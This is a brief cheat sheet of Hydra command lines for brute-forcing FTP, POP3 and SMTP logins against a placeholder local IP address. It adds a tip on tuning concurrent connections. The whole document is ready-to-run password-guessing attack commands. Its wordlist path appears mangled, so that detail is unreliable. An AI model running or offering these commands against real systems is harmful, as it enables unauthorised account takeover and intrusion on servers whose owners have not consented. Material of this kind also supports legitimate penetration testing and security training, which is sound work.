# Hydra Brute Force
### FTP brute force
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V
```
### POP3 brute force
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V
```
### SMTP brute force
```
hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
```

Use -t to limit concurrent connections, example: -t 15


